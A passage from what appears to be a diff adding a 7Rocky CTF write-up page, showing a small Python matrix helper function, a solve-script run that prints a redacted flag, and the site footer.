+<span class="mtk7 mtki">def</span> <span class=mtk8>add_column</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_vector</span><span class=mtk1>):</span>
+    <span class=mtk1>z_mat</span> <span class=mtk5>=</span> <span class="mtk9 mtki">x_mat</span><span class=mtk1>.copy()</span>
+
+    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_vector</span><span class=mtk1>)):</span>
+        <span class=mtk1>z_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>].append(</span><span class="mtk9 mtki">y_vector</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>])</span>
+
+    <span class=mtk5>return</span> <span class=mtk1>z_mat</span>
+</code></pre></div>
+<p>Finally, if we run the script, we get the second flag:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py http://35.190.155.168/c33a5d03b6  
+Unlocked successfully.  Flag: ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  
+</code></pre></div>
+<div class="mt6 instapaper_ignoref">
+</div>
+</div>
+<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
+</aside>
+</article>
+</main>
+<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
+<div class="flex justify-between">
+<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
+<div style=margin-top:8px>
+<div>
+<div>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</body>
+</html>
